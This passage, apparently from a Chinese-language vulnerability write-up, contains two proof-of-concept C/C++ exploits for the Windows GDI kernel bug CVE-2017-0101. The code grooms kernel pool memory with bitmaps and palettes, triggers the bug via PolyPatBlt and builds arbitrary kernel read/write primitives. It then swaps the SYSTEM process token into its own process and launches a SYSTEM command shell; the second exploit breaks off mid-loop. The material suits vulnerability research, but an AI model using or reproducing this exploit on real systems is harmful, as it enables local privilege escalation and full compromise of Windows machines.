    return TRUE;
`}`

static
    BOOL xxPointToHit(LONG addr, PVOID pvBits, DWORD cb)
`{`
    UINT iLeng = 0;
    pBmpHunted[iExtPalColor] = addr;
    iLeng = SetBitmapBits(hBmpHunted, 0xD00, pBmpHunted);
    if (iLeng &lt; 0xD00)
    `{`
        return FALSE;
    `}`
    PVOID pvTable = NULL;
    UINT cbSize = (cb + 3) &amp; ~3; // sizeof(PALETTEENTRY) =&gt; 4
    pvTable = malloc(cbSize);
    memcpy(pvTable, pvBits, cb);
    iLeng = SetPaletteEntries(hPalExtend, 0, cbSize / 4, (PPALETTEENTRY)pvTable);
    free(pvTable);
    if (iLeng &lt; cbSize / 4)
    `{`
        return FALSE;
    `}`
    return TRUE;
`}`

static
    BOOL xxPointToGet(LONG addr, PVOID pvBits, DWORD cb)
`{`
    BOOL iLeng = 0;
    pBmpHunted[iExtPalColor] = addr;
    iLeng = SetBitmapBits(hBmpHunted, 0xD00, pBmpHunted);
    if (iLeng &lt; 0xD00)
    `{`
        return FALSE;
    `}`
    PVOID pvTable = NULL;
    UINT cbSize = (cb + 3) &amp; ~3; // sizeof(PALETTEENTRY) =&gt; 4
    pvTable = malloc(cbSize);
    iLeng = GetPaletteEntries(hPalExtend, 0, cbSize / 4, (PPALETTEENTRY)pvTable);
    memcpy(pvBits, pvTable, cb);
    free(pvTable);
    if (iLeng &lt; cbSize / 4)
    `{`
        return FALSE;
    `}`
    return TRUE;
`}`

static
    BOOL xxFixHuntedPoolHeader(VOID)
`{`
    DWORD szInputBit[0x100] = `{` 0 `}`;
    CONST LONG iTrueBmpHead = 937;
    szInputBit[0] = pBmpHunted[iTrueBmpHead + 0];
    szInputBit[1] = pBmpHunted[iTrueBmpHead + 1];
    BOOL bReturn = FALSE;
    bReturn = xxPointToHit(iMemHunted + 0x000, szInputBit, 0x08);
    if (!bReturn)
    `{`
        return FALSE;
    `}`
    return TRUE;
`}`

static
    BOOL xxFixHuntedBitmapObject(VOID)
`{`
    DWORD szInputBit[0x100] = `{` 0 `}`;
    szInputBit[0] = (DWORD)hBmpHunted;
    BOOL bReturn = FALSE;
    bReturn = xxPointToHit(iMemHunted + 0x08, szInputBit, 0x04);
    if (!bReturn)
    `{`
        return FALSE;
    `}`
    bReturn = xxPointToHit(iMemHunted + 0x1c, szInputBit, 0x04);
    if (!bReturn)
    `{`
        return FALSE;
    `}`
    return TRUE;
`}`

static
    DWORD_PTR
    xxGetNtoskrnlAddress(VOID)
`{`
    DWORD_PTR AddrList[500] = `{` 0 `}`;
    DWORD cbNeeded = 0;
    EnumDeviceDrivers((LPVOID *)&amp;AddrList, sizeof(AddrList), &amp;cbNeeded);
    return AddrList[0];
`}`

static
    DWORD_PTR
    xxGetSysPROCESS(VOID)
`{`
    DWORD_PTR Module = 0x00;
    DWORD_PTR NtAddr = 0x00;
    Module = (DWORD_PTR)LoadLibraryA("ntkrnlpa.exe");
    NtAddr = (DWORD_PTR)GetProcAddress((HMODULE)Module, "PsInitialSystemProcess");
    FreeLibrary((HMODULE)Module);
    NtAddr = NtAddr - Module;
    Module = xxGetNtoskrnlAddress();
    if (Module == 0x00)
    `{`
        return 0x00;
    `}`
    NtAddr = NtAddr + Module;
    if (!xxPointToGet(NtAddr, &amp;NtAddr, sizeof(DWORD_PTR)))
    `{`
        return 0x00;
    `}`
    return NtAddr;
`}`

CONST LONG off_EPROCESS_UniqueProId = 0x0b4;
CONST LONG off_EPROCESS_ActiveLinks = 0x0b8;

static
    DWORD_PTR
    xxGetTarPROCESS(DWORD_PTR SysPROC)
`{`
    if (SysPROC == 0x00)
    `{`
        return 0x00;
    `}`
    DWORD_PTR point = SysPROC;
    DWORD_PTR value = 0x00;
    do
    `{`
        value = 0x00;
        xxPointToGet(point + off_EPROCESS_UniqueProId, &amp;value, sizeof(DWORD_PTR));
        if (value == 0x00)
        `{`
            break;
        `}`
        if (value == GetCurrentProcessId())
        `{`
            return point;
        `}`
        value = 0x00;
        xxPointToGet(point + off_EPROCESS_ActiveLinks, &amp;value, sizeof(DWORD_PTR));
        if (value == 0x00)
        `{`
            break;
        `}`
        point = value - off_EPROCESS_ActiveLinks;
        if (point == SysPROC)
        `{`
            break;
        `}`
    `}` while (TRUE);
    return 0x00;
`}`

CONST LONG off_EPROCESS_Token = 0x0f8;
static DWORD_PTR dstToken = 0x00;
static DWORD_PTR srcToken = 0x00;

static
    BOOL
    xxModifyTokenPointer(DWORD_PTR dstPROC, DWORD_PTR srcPROC)
`{`
    if (dstPROC == 0x00 || srcPROC == 0x00)
    `{`
        return FALSE;
    `}`
    // get target process original token pointer
    xxPointToGet(dstPROC + off_EPROCESS_Token, &amp;dstToken, sizeof(DWORD_PTR));
    if (dstToken == 0x00)
    `{`
        return FALSE;
    `}`
    // get system process token pointer
    xxPointToGet(srcPROC + off_EPROCESS_Token, &amp;srcToken, sizeof(DWORD_PTR));
    if (srcToken == 0x00)
    `{`
        return FALSE;
    `}`
    // modify target process token pointer to system
    xxPointToHit(dstPROC + off_EPROCESS_Token, &amp;srcToken, sizeof(DWORD_PTR));
    // just test if the modification is successful
    DWORD_PTR tmpToken = 0x00;
    xxPointToGet(dstPROC + off_EPROCESS_Token, &amp;tmpToken, sizeof(DWORD_PTR));
    if (tmpToken != srcToken)
    `{`
        return FALSE;
    `}`
    return TRUE;
`}`

static
    BOOL
    xxRecoverTokenPointer(DWORD_PTR dstPROC, DWORD_PTR srcPROC)
`{`
    if (dstPROC == 0x00 || srcPROC == 0x00)
    `{`
        return FALSE;
    `}`
    if (dstToken == 0x00 || srcToken == 0x00)
    `{`
        return FALSE;
    `}`
    // recover the original token pointer to target process
    xxPointToHit(dstPROC + off_EPROCESS_Token, &amp;dstToken, sizeof(DWORD_PTR));
    return TRUE;
`}`

static
    VOID xxCreateCmdLineProcess(VOID)
`{`
    STARTUPINFO si = `{` sizeof(si) `}`;
    PROCESS_INFORMATION pi = `{` 0 `}`;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;
    WCHAR wzFilePath[MAX_PATH] = `{` L"cmd.exe" `}`;
    BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi);
    if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
`}`

static
    VOID xxPrivilegeElevation(VOID)
`{`
    BOOL bReturn = FALSE;
    do
    `{`
        DWORD SysPROC = 0x0;
        DWORD TarPROC = 0x0;
        POCDEBUG_BREAK();
        SysPROC = xxGetSysPROCESS();
        if (SysPROC == 0x00)
        `{`
            break;
        `}`
        std::cout &lt;&lt; "SYSTEM PROCESS: " &lt;&lt; (PVOID)SysPROC &lt;&lt; std::endl;
        POCDEBUG_BREAK();
        TarPROC = xxGetTarPROCESS(SysPROC);
        if (TarPROC == 0x00)
        `{`
            break;
        `}`
        std::cout &lt;&lt; "TARGET PROCESS: " &lt;&lt; (PVOID)TarPROC &lt;&lt; std::endl;
        POCDEBUG_BREAK();
        bReturn = xxModifyTokenPointer(TarPROC, SysPROC);
        if (!bReturn)
        `{`
            break;
        `}`
        std::cout &lt;&lt; "MODIFIED TOKEN TO SYSTEM!" &lt;&lt; std::endl;
        std::cout &lt;&lt; "CREATE NEW CMDLINE PROCESS..." &lt;&lt; std::endl;
        POCDEBUG_BREAK();
        xxCreateCmdLineProcess();
        POCDEBUG_BREAK();
        std::cout &lt;&lt; "RECOVER TOKEN..." &lt;&lt; std::endl;
        bReturn = xxRecoverTokenPointer(TarPROC, SysPROC);
        if (!bReturn)
        `{`
            break;
        `}`
        bReturn = TRUE;
    `}` while (FALSE);
    if (!bReturn)
    `{`
        std::cout &lt;&lt; "FAILED" &lt;&lt; std::endl;
    `}`
`}`

INT POC_CVE20170101(VOID)
`{`
    std::cout &lt;&lt; "-------------------" &lt;&lt; std::endl;
    std::cout &lt;&lt; "POC - CVE-2017-0101" &lt;&lt; std::endl;
    std::cout &lt;&lt; "-------------------" &lt;&lt; std::endl;

    BOOL bReturn = FALSE;
    HDC hdc = NULL;
    HBITMAP hbmp = NULL;
    HBRUSH hbru = NULL;
    pfPolyPatBlt pfnPolyPatBlt = NULL;
    do
    `{`
        hdc = GetDC(NULL);
        std::cout &lt;&lt; "GET DEVICE CONTEXT: " &lt;&lt; hdc &lt;&lt; std::endl;
        if (hdc == NULL)
        `{`
            break;
        `}`

        std::cout &lt;&lt; "CREATE PATTERN BRUSH BITMAP..." &lt;&lt; std::endl;
        hbmp = CreateBitmap(0x36D, 0x12AE8F, 1, 1, NULL);
        if (hbmp == NULL)
        `{`
            break;
        `}`

        std::cout &lt;&lt; "CREATE PATTERN BRUSH..." &lt;&lt; std::endl;
        hbru = CreatePatternBrush(hbmp);
        if (hbru == NULL)
        `{`
            break;
        `}`

        std::cout &lt;&lt; "CREATE BITMAPS (1)..." &lt;&lt; std::endl;
        bReturn = xxCreateBitmaps(0xE8C, 1, 8);
        if (!bReturn)
        `{`
            break;
        `}`

        std::cout &lt;&lt; "REGISTER WINDOW CLASSES..." &lt;&lt; std::endl;
        bReturn = xxRegisterWndClasses("KCUF");
        if (!bReturn)
        `{`
            break;
        `}`

        std::cout &lt;&lt; "DELETE BITMAPS (1)..." &lt;&lt; std::endl;
        xxDeleteBitmaps();

        std::cout &lt;&lt; "CREATE BITMAPS (2)..." &lt;&lt; std::endl;
        bReturn = xxCreateBitmaps(0xC98, 1, 8);
        if (!bReturn)
        `{`
            break;
        `}`

        std::cout &lt;&lt; "CREATE PALETTES (1)..." &lt;&lt; std::endl;
        bReturn = xxCreatePalettes(0x64);
        if (!bReturn)
        `{`
            break;
        `}`

        std::cout &lt;&lt; "UNREGISTER WINDOW CLASSES (H)..." &lt;&lt; std::endl;
        xxDigHoleInWndClasses(1000, 2000);

        std::cout &lt;&lt; "POLYPATBLT..." &lt;&lt; std::endl;
        POCDEBUG_BREAK();
        pfnPolyPatBlt = (pfPolyPatBlt)GetProcAddress(GetModuleHandleA("gdi32"), "PolyPatBlt");
        if (pfnPolyPatBlt == NULL)
        `{`
            break;
        `}`
        PATRECT ppb[1] = `{` 0 `}`;
        ppb[0].nXLeft  = 0x100;
        ppb[0].nYLeft  = 0x100;
        ppb[0].nWidth  = 0x100;
        ppb[0].nHeight = 0x100;
        ppb[0].hBrush  = hbru;
        pfnPolyPatBlt(hdc, PATCOPY, ppb, 1, 0);

        std::cout &lt;&lt; "LOCATE HUNTED BITMAP..." &lt;&lt; std::endl;
        bReturn = xxRetrieveBitmapBits();
        if (!bReturn)
        `{`
            break;
        `}`

        // std::cout &lt;&lt; "OUTPUT BITMAP BITS..." &lt;&lt; std::endl;
        // xxOutputBitmapBits();

        std::cout &lt;&lt; "LOCATE EXTEND PALETTE..." &lt;&lt; std::endl;
        bReturn = xxGetExtendPalette((HPALETTE)pBmpHunted[iExtPaleHmgr]);
        if (!bReturn)
        `{`
            break;
        `}`

        if ((pBmpHunted[iExtcEntries]) != 0x64 ||
            (pBmpHunted[iExtPalColor] &amp; 0xFFF) != 0x00000E54)
        `{`
            bReturn = FALSE;
            std::cout &lt;&lt; "FAILED: " &lt;&lt; (PVOID)pBmpHunted[iExtPalColor] &lt;&lt; std::endl;
            break;
        `}`
        iMemHunted = (pBmpHunted[iExtPalColor] &amp; ~0xFFF);
        std::cout &lt;&lt; "HUNTED PAGE: " &lt;&lt; (PVOID)iMemHunted &lt;&lt; std::endl;
        std::cout &lt;&lt; "FIX HUNTED POOL HEADER..." &lt;&lt; std::endl;
        bReturn = xxFixHuntedPoolHeader();
        if (!bReturn)
        `{`
            break;
        `}`

        std::cout &lt;&lt; "FIX HUNTED BITMAP OBJECT..." &lt;&lt; std::endl;
        bReturn = xxFixHuntedBitmapObject();
        if (!bReturn)
        `{`
            break;
        `}`

        std::cout &lt;&lt; "-------------------" &lt;&lt; std::endl;
        std::cout &lt;&lt; "PRIVILEGE ELEVATION" &lt;&lt; std::endl;
        std::cout &lt;&lt; "-------------------" &lt;&lt; std::endl;
        xxPrivilegeElevation();
        std::cout &lt;&lt; "-------------------" &lt;&lt; std::endl;

        std::cout &lt;&lt; "DELETE BITMAPS (2)..." &lt;&lt; std::endl;
        xxDeleteBitmaps();

        std::cout &lt;&lt; "DELETE PALETTES (1)..." &lt;&lt; std::endl;
        xxDeletePalettes();

        bReturn = TRUE;
    `}` while (FALSE);

    if (bReturn == FALSE)
    `{`
        std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl;
    `}`

    POCDEBUG_BREAK();
    std::cout &lt;&lt; "DELETE BRUSH..." &lt;&lt; std::endl;
    DeleteObject(hbru);
    DeleteObject(hbmp);

    std::cout &lt;&lt; "UNREGISTER WINDOW CLASSES (1)..." &lt;&lt; std::endl;
    xxUnregisterWndClasses();

    std::cout &lt;&lt; "-------------------" &lt;&lt; std::endl;
    getchar();
    return 0;
`}`


int _tmain(int argc, _TCHAR* argv[])
`{`
    POC_CVE20170101();
    return 0;
`}`
```

### <a class="reference-link" name="4.4%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%96%B9%E6%B3%95POC"></a>4.4第二种方法POC

```
// test.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "windows.h"

typedef struct _PATRECT `{`
    INT nXLeft;
    INT nYLeft;
    INT nWidth;
    INT nHeight;
    HBRUSH hBrush;
`}` PATRECT, *PPATRECT;

typedef 
BOOL(WINAPI *PFN_PolyPatBlt)(
    HDC hdc,
    DWORD rop,
    PVOID pPoly,
    DWORD Count,
    DWORD Mode
);

typedef enum _PROCESSINFOCLASS `{`
    ProcessBasicInformation,
    ProcessQuotaLimits,
    ProcessIoCounters,
    ProcessVmCounters,
    ProcessTimes,
    ProcessBasePriority,
    ProcessRaisePriority,
    ProcessDebugPort,
    ProcessExceptionPort,
    ProcessAccessToken,
    ProcessLdtInformation,
    ProcessLdtSize,
    ProcessDefaultHardErrorMode,
    ProcessIoPortHandlers,
    ProcessPooledUsageAndLimits,
    ProcessWorkingSetWatch,
    ProcessUserModeIOPL,
    ProcessEnableAlignmentFaultFixup,
    ProcessPriorityClass,
    ProcessWx86Information,
    ProcessHandleCount,
    ProcessAffinityMask,
    ProcessPriorityBoost,
    ProcessDeviceMap,
    ProcessSessionInformation,
    ProcessForegroundInformation,
    ProcessWow64Information,
    ProcessImageFileName,
    ProcessLUIDDeviceMapsEnabled,
    ProcessBreakOnTermination,
    ProcessDebugObjectHandle,
    ProcessDebugFlags,
    ProcessHandleTracing,
    ProcessIoPriority,
    ProcessExecuteFlags,
    ProcessTlsInformation,
    ProcessCookie,
    ProcessImageInformation,
    ProcessCycleTime,
    ProcessPagePriority,
    ProcessInstrumentationCallback,
    ProcessThreadStackAllocation,
    ProcessWorkingSetWatchEx,
    ProcessImageFileNameWin32,
    ProcessImageFileMapping,
    ProcessAffinityUpdateMode,
    ProcessMemoryAllocationMode,
    ProcessGroupInformation,
    ProcessTokenVirtualizationEnabled,
    ProcessConsoleHostProcess,
    ProcessWindowInformation,
    MaxProcessInfoClass
`}` PROCESSINFOCLASS;

typedef enum _SYSTEM_INFORMATION_CLASS `{`
    SystemModuleInformation = 11,
    SystemHandleInformation = 16
`}` SYSTEM_INFORMATION_CLASS;

typedef
NTSTATUS(NTAPI *pfnNtQueryInformationProcess)(
    IN  HANDLE ProcessHandle,
    IN  PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN  ULONG ProcessInformationLength,
    OUT PULONG ReturnLength    OPTIONAL
    );

typedef
NTSTATUS(WINAPI *NtQuerySystemInformation_t)
(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    OUT PVOID                   SystemInformation,
    IN ULONG                    SystemInformationLength,
    OUT PULONG                  ReturnLength
    );

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)


typedef struct _GDICELL
`{`
    LPVOID pKernelAddress;
    USHORT wProcessId;
    USHORT wCount;
    USHORT wUpper;
    USHORT wType;
    LPVOID pUserAddress;
`}` GDICELL;


typedef struct _LSA_UNICODE_STRING `{`
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
`}` LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PEB_LDR_DATA `{`
    BYTE Reserved1[8];
    PVOID Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
`}` PEB_LDR_DATA, *PPEB_LDR_DATA;


typedef struct _RTL_USER_PROCESS_PARAMETERS `{`
    BYTE Reserved1[16];
    PVOID Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
`}` RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef
VOID
(NTAPI *PPS_POST_PROCESS_INIT_ROUTINE) (
    VOID
    );
typedef struct _PEB `{`
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    BYTE Reserved4[104];
    PVOID Reserved5[52];
    PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
    BYTE Reserved6[128];
    PVOID Reserved7[1];
    ULONG SessionId;
`}` PEB, *PPEB;

typedef struct _PROCESS_BASIC_INFORMATION `{`
    PVOID Reserved1;
    PPEB PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
`}` PROCESS_BASIC_INFORMATION;
typedef PROCESS_BASIC_INFORMATION *PPROCESS_BASIC_INFORMATION;

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY `{`
    PVOID  Unknown1;
    PVOID  Unknown2;
    PVOID  Base;
    ULONG  Size;
    ULONG  Flags;
    USHORT Index;
    USHORT NameLength;
    USHORT LoadCount;
    USHORT PathLength;
    CHAR   ImageName[256];
`}` SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION `{`
    ULONG   Count;
    SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
`}` SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;



#define Bitmap_Count 2000
#define Bitmap_Washer_Count 3000
#define WndClass_Count 3000

HBITMAP g_aryhBitmapxFE8[Bitmap_Count] = `{` 0 `}`;
HBITMAP g_aryhBitmapxD88[Bitmap_Count] = `{` 0 `}`;
HBITMAP g_aryhBitmapx260[Bitmap_Washer_Count] = `{` 0 `}`;

DWORD g_fixPoolhead0 = 0;
DWORD g_fixPoolhead1 = 0;
DWORD g_fixPoolHeadAddr = 0;
DWORD g_fixBaseObjHanlde = 0;
DWORD g_fixBaseOBJhandleAddr = 0;
DWORD g_nextBitmapHanlde = 0;

PFN_PolyPatBlt g_PfnPolyPatBlt = NULL;

BOOL BitmapHoleMem_xFE8()
`{`
    for (unsigned int i = 0; i &lt; Bitmap_Count; i++)
    `{`
        g_aryhBitmapxFE8[i] = CreateBitmap(0xE8C, 0x1, 1, 8, NULL);
        if (!g_aryhBitmapxFE8[i])
        `{`
            return FALSE;
        `}`
    `}`
    return TRUE;
`}`

BOOL WndClassHoleMem_x18()
`{`
    CHAR buf[0x10] = `{` 0 `}`;
    for (LONG i = 0; i &lt; WndClass_Count; i++)
    `{`
        WNDCLASSEXA Class = `{` 0 `}`;
        sprintf(buf, "CLS_%d", i);
        Class.lpfnWndProc = DefWindowProcA;
        Class.lpszClassName = buf;
        Class.lpszMenuName = "0110";
        Class.cbSize = sizeof(WNDCLASSEXA);
        if (!RegisterClassExA(&amp;Class))
        `{`
            return FALSE;
        `}`
    `}`
    return TRUE;
`}`

void BitmapReleaseMem_xFE8()
`{`
    for (LONG i = 0; i &lt; Bitmap_Count; i++)
    `{`
        DeleteObject(g_aryhBitmapxFE8[i]);
        g_aryhBitmapxFE8[i] = NULL;
    `}`
`}`

BOOL BitmapHoleMem_xD88()
`{`
    for (unsigned int i = 0; i &lt; Bitmap_Count; i++)
    `{`
        g_aryhBitmapxD88[i] = CreateBitmap(0xc2c, 0x1, 1, 8, NULL);
        if (!g_aryhBitmapxD88[i])
        `{`
            return FALSE;
        `}`
    `}`
    return TRUE;
`}`

BOOL BitmapHoleMem_x260()
`{`
    for (unsigned int i = 0; i &lt; Bitmap_Washer_Count; i++)
    `{`
        g_aryhBitmapx260[i] = CreateBitmap(0x42, 0x1, 1, 8, NULL);
        if (!g_aryhBitmapx260[i])
        `{`
            return FALSE;
        `}`
    `}`
    return TRUE;
`}`

void WndClassReleaseMem_x18()
`{`
    CHAR buf[0x10] = `{` 0 `}`;
    for (LONG i = 1000; i &lt; 2000; i++)
    `{`
        sprintf(buf, "CLS_%d", i);
        UnregisterClassA(buf, NULL);
    `}`
`}`

BOOL TriggerEngRealizeBrush()
`{`
    BOOL bRet = FALSE;
    do
    `{`
        HDC hdc = GetDC(NULL);
        if (!hdc)
        `{`
            break;
        `}`
        HBITMAP hbmp = CreateBitmap(0x36D, 0x12AE8F, 1, 1, NULL);
        if (!hbmp)
        `{`
            break;
        `}`
        HBRUSH hbru = CreatePatternBrush(hbmp);
        if (!hbru)
        `{`
            break;
        `}`
        g_PfnPolyPatBlt = (PFN_PolyPatBlt)GetProcAddress(GetModuleHandleA("gdi32"), "PolyPatBlt");
        if (!g_PfnPolyPatBlt)
        `{`
            break;
        `}`
        PATRECT ppb[1] = `{` 0 `}`;
        ppb[0].nXLeft = 0x100;
        ppb[0].nYLeft = 0x100;
        ppb[0].nWidth = 0x100;
        ppb[0].nHeight = 0x100;
        ppb[0].hBrush = hbru;
        bRet = g_PfnPolyPatBlt(hdc, PATCOPY, ppb, 1, 0);
    `}` while (TRUE);
    return bRet;
`}`

PVOID GetGdiSharedHandleTable32()
`{`
    PVOID pGdiSharedHandleTable32 = NULL;
    HMODULE hNtDll = LoadLibraryA("ntdll.dll");
    if (hNtDll)
    `{`
        pfnNtQueryInformationProcess MyNtQueryInformationProcess = NULL;
        MyNtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(hNtDll, "NtQueryInformationProcess");
        if (MyNtQueryInformationProcess)
        `{`
            PROCESS_BASIC_INFORMATION psInfo = `{` 0 `}`;
            ULONG uRetLen = 0;
            NTSTATUS dwStatus = MyNtQueryInformationProcess(GetCurrentProcess(),
                ProcessBasicInformation,
                &amp;psInfo,
                sizeof(PROCESS_BASIC_INFORMATION),
                &amp;uRetLen);
            if (dwStatus == STATUS_SUCCESS)
            `{`
                PPEB pMyPeb = psInfo.PebBaseAddress;
                if (pMyPeb)
                `{`
                    pGdiSharedHandleTable32 = (PCHAR)(pMyPeb)+0x94;
                `}`
            `}`
        `}`
    `}`
    return pGdiSharedHandleTable32;
`}`

void PrintBitmapBits(byte *b, int nSize)
`{`
    for (int i = 0; i &lt; nSize; i++)
    `{`
        if (i % 16 == 0)
        `{`
            printf("rn");
        `}`
        printf("%02X ", b[i]);
    `}`
`}`

PVOID getpvscan0(PVOID GdiSharedHandleTable, HANDLE h)
`{`
    DWORD p = ((*(DWORD*)GdiSharedHandleTable) + LOWORD(h) * sizeof(GDICELL)) &amp; 0x00000000ffffffff;
    GDICELL *c = (GDICELL*)p;
    return (char*)c-&gt;pKernelAddress + 0x30;
`}`

void BuildArbitraryWR()
`{`
    byte* p = (PBYTE)malloc(0x1000);
    for (unsigned int i = 0; i &lt; Bitmap_Count; i++)
    `{`
        memset(p, 0, 0x1000);
        long iLeng = GetBitmapBits(g_aryhBitmapxD88[i], 0x1000, p);
        printf("Read Len %08Xrn", iLeng);
        if (iLeng &lt; 0xCA0)
        `{`
            continue;
        `}`
        g_fixPoolhead0 = *(DWORD*)(p + 0xc2c + 0x260 + 0x18);
        g_fixPoolhead1 = *(DWORD*)(p + 0xc2c + 0x260 + 0x18 + 4);
        g_fixBaseObjHanlde = (DWORD)g_aryhBitmapxD88[i];
        g_nextBitmapHanlde = *(DWORD*)(p + 0xc2c + 8);
        printf("%08X %08X %08X %08xrn", g_fixPoolhead0, g_fixPoolhead1, g_fixBaseObjHanlde, g_nextBitmapHanlde);
        PVOID pGdiSharedHandleTable = GetGdiSharedHandleTable32();
        PVOID wpv = getpvscan0(pGdiSharedHandleTable, (HANDLE)g_fixBaseObjHanlde);
        g_fixPoolHeadAddr = (DWORD)wpv - 0x30 - 0x8;
        g_fixBaseOBJhandleAddr = (DWORD)wpv - 0x30;
        *(PDWORD)(p + 0xc2c + 0x8 + 0x10 + 0x20) = (DWORD)wpv;
        SetBitmapBits(g_aryhBitmapxD88[i], 0x1000, p);
        PrintBitmapBits(p, iLeng);
        break;
    `}`
    free(p);
    p = NULL;
`}`

DWORD BitMapRead(HANDLE hManager, HANDLE hWorker, PVOID pReadAddr)
`{`
    DWORD dwAddr = (DWORD)pReadAddr;
    DWORD dwRead = 0;
    SetBitmapBits((HBITMAP)hManager, sizeof(PVOID), &amp;dwAddr);
    GetBitmapBits((HBITMAP)hWorker, sizeof(PVOID), &amp;dwRead);
    return dwRead;
`}`

void BitMapWrite(HANDLE hManager, HANDLE hWorker, PVOID pWriteAddr, DWORD dwWWhat)
`{`
    DWORD dwAddr = (DWORD)pWriteAddr;
    DWORD dwWhat = dwWWhat;
    SetBitmapBits((HBITMAP)hManager, sizeof(PVOID), &amp;dwAddr);
    SetBitmapBits((HBITMAP)hWorker, sizeof(PVOID), &amp;dwWhat);
`}`

void FixPoolHead()
`{`
    BitMapWrite((HANDLE)g_nextBitmapHanlde, (HANDLE)g_fixBaseObjHanlde, (PVOID)g_fixPoolHeadAddr, g_fixPoolhead0);
    BitMapWrite((HANDLE)g_nextBitmapHanlde, (HANDLE)g_fixBaseObjHanlde, (PVOID)(g_fixPoolHeadAddr + 4), g_fixPoolhead1);
`}`

void FixBaseObjHandle()
`{`
    BitMapWrite((HANDLE)g_nextBitmapHanlde, (HANDLE)g_fixBaseObjHanlde, (PVOID)g_fixBaseOBJhandleAddr, g_fixBaseObjHanlde);
`}`

PVOID GetPsInitialSystemProcess() `{`
    PCHAR KernelImage;
    SIZE_T ReturnLength;
    HMODULE hNtDll = NULL;
    PVOID PsInitialSystemProcess = NULL;
    HMODULE hKernelInUserMode = NULL;
    PVOID KernelBaseAddressInKernelMode;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
    PSYSTEM_MODULE_INFORMATION pSystemModuleInformation;
    hNtDll = LoadLibraryA("ntdll.dll");
    if (!hNtDll) `{`
        exit(EXIT_FAILURE);
    `}`
    NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtDll, "NtQuerySystemInformation");
    if (!NtQuerySystemInformation) `{`
        exit(EXIT_FAILURE);
    `}`
    NtStatus = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &amp;ReturnLength);
    // Allocate the Heap chunk
    pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        ReturnLength);
    if (!pSystemModuleInformation) `{`
        exit(EXIT_FAILURE);
    `}`
    NtStatus = NtQuerySystemInformation(SystemModuleInformation,
        pSystemModuleInformation,
        ReturnLength,
        &amp;ReturnLength);
    if (NtStatus != STATUS_SUCCESS) `{`
        exit(EXIT_FAILURE);
    `}`
    KernelBaseAddressInKernelMode = pSystemModuleInformation-&gt;Module[0].Base;
    KernelImage = strrchr((PCHAR)(pSystemModuleInformation-&gt;Module[0].ImageName), '\') + 1;
    hKernelInUserMode = LoadLibraryA(KernelImage);
    if (!hKernelInUserMode) `{`
        exit(EXIT_FAILURE);
    `}`
    // This is still in user mode
    PsInitialSystemProcess = (PVOID)GetProcAddress(hKernelInUserMode, "PsInitialSystemProcess");
    if (!PsInitialSystemProcess) `{`
        exit(EXIT_FAILURE);
    `}`
    else `{`
        PsInitialSystemProcess = (PVOID)((ULONG_PTR)PsInitialSystemProcess - (ULONG_PTR)hKernelInUserMode);
        // Here we get the address of HapDispatchTable in Kernel mode
        PsInitialSystemProcess = (PVOID)((ULONG_PTR)PsInitialSystemProcess + (ULONG_PTR)KernelBaseAddressInKernelMode);
    `}`
    HeapFree(GetProcessHeap(), 0, (LPVOID)pSystemModuleInformation);
    if (hNtDll) `{`
        FreeLibrary(hNtDll);
    `}`
    if (hKernelInUserMode) `{`
        FreeLibrary(hKernelInUserMode);
    `}`
    hNtDll = NULL;
    hKernelInUserMode = NULL;
    pSystemModuleInformation = NULL;
    return PsInitialSystemProcess;
`}`

void PrivilegeUp()
`{`
    PVOID PsInitialSystemProcess = GetPsInitialSystemProcess();
    PVOID pFirstEprocess = (PVOID)BitMapRead((HANDLE)g_nextBitmapHanlde, (HANDLE)g_fixBaseObjHanlde, PsInitialSystemProcess);
    DWORD dwSystemTokenAddr = (DWORD)pFirstEprocess + 0xF8;
    printf("PsInitialSystemProcess Addr %p pFirstEprocess %p dwSystemTokenAddr %08X~~~rn",
        PsInitialSystemProcess, pFirstEprocess, dwSystemTokenAddr);
    DWORD dwToken = BitMapRead((HANDLE)g_nextBitmapHanlde, (HANDLE)g_fixBaseObjHanlde, (PVOID)dwSystemTokenAddr);
    printf("Get System Token %08X~~~rn", dwToken);
    PVOID pActiveProcessLinks = (PVOID)((DWORD)pFirstEprocess + 0xb8);
    PVOID pNextEprocess = (PVOID)BitMapRead((HANDLE)g_nextBitmapHanlde, (HANDLE)g_fixBaseObjHanlde, pActiveProcessLinks);
    pNextEprocess = (PVOID)((DWORD)pNextEprocess - 0xb8);
    printf("pNextEprocess %prn", pNextEprocess);
    while (TRUE)
    `{`
